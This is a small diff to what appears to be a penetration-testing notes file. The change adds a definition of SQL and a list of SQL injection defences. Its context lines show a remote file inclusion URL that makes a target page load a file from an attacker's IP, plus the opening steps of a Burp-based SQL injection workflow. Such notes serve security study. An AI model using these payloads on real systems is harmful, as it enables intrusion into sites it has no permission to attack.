@@ -210,6 +210,9 @@ http://target.com/test.php?page=http://<attacker IP>/test.txt
 
 # SQL Injection
 
+Structured Query Language (SQL)
+Can be prevent by doing input validation, parameterized queries, stored procedures, and implementing a Web Application Firewall (WAF).
+
 Use Burp, turn the Proxy intercept on.
 Send a form request with no data using the browser.
 Capture the request, right-click on the POST > Copy to file: login.txt
